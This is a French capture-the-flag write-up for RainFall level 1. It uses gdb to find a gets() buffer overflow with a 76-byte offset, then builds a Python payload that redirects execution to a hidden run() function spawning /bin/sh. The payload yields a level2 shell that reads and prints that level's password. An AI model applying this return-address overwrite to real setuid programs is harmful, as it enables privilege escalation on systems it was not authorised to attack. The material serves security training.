#LEVEL 1

Nous avons un executable ./level1 avec les setuid/setgid.

   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048490 <+16>:	call   0x8048340 <gets@plt>

Avec gdb on voit 80 octets alloue puis plus loin un appel a gets.
La fonction gets contient une faille comme indiquee dans le man que nous allons
exploitee via un buffer overflow.

Nous allons calculer la size de notre buffer en soustrayant l'adresse de retour
(break avant le leave) EIP avec l'adresse du debut de notre buffer.

(gdb) info frame
Stack level 0, frame at 0xbffff700:
 eip = 0x8048495 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff6f8, args:
 Locals at 0xbffff6f8, Previous frame's sp is 0xbffff700
 Saved registers:
  ebp at 0xbffff6f8, eip at 0xbffff6fc

(gdb) x /30xw $esp
0xbffff6a0:	0xbffff6b0	0x0000002f	0xbffff6fc	0xb7fd0ff4
0xbffff6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x08040041	0xb7fd0ff4
0xbffff6f0:	0x080484a0	0x00000000	0x00000000	0xb7e454d3
0xbffff700:	0x00000001	0xbffff794	0xbffff79c	0xb7fdc858
0xbffff710:	0x00000000	0xbffff71c

(gdb) p /d 0xbffff6fc - 0xbffff6b0
$1 = 76

Notre buffer est donc de 76 octets.

Nous jetons un coup d'oeils au fonctions definies dans notre programme:

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system									<-----------
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run										<------------
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini

Nous voyons ici la fonction system qui n'est pas appele dans le main et il en
est de meme pour la fonction run.
Regardons de plus pres cette fonction run:

   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>

	(gdb) x/s 0x8048584
	0x8048584:	 "/bin/sh"

Ces deux lignes nous interessent, on y trouve la chaine "/bin/sh" qui est moove
sur le haut de la pile avant le call a system.
Cette fonction nous permet donc de lancer un shell..

Le bufferoverflow exploitable de gets et cette fonction run sont les outils
qui vont nous permettre de passe le niveau suivant.

Nous preparons notre script de 76 chars suivi de l'adresse de run:

level1@RainFall:~$ python -c 'print "A"*76+"\x44\x84\x04\x08"' > /tmp/buffa

Nous n'avons plus qu'a lance le tout:
Nous envoyer les deux outputs de cat un sur le fichier l'autre sur stdin qui
serviront d'input pour le binaire.
Le premier cat, celui de notre exploit servira a injecter notre code via
le gets, le deuxieme nous permet de maintenir le shell ouvert.
En effet, une fois executer via run, le shell attendra un input pour pouvoir
fonctionner, cependant le gets a recuperer l'input il n'y aurait donc plus rien
a utiliser pour le shell et il aurait donc exit, nous lui envoi donc un input
sur stdin pour qu'il puisse rester exploitable.

level1@RainFall:~$ (cat /tmp/buffa; cat ) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

Next level..
